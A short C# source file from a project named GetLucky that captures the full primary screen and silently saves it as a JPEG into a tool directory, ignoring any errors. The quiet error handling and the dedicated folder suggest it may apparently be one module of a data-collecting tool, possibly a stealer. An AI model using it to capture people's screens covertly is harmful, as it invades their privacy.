using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace GetLucky
{
    
    class Screenshot
    {
        public static void GetScreenShot(string GetLucky_Dir)
        {
            try
            {
                int width = Screen.PrimaryScreen.Bounds.Width;
                int height = Screen.PrimaryScreen.Bounds.Height;
                Bitmap bitmap = new Bitmap(width, height);
                Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(GetLucky_Dir + $"\\Screenshot.Jpeg", ImageFormat.Jpeg);
            }
            catch { }
        }
    }
}
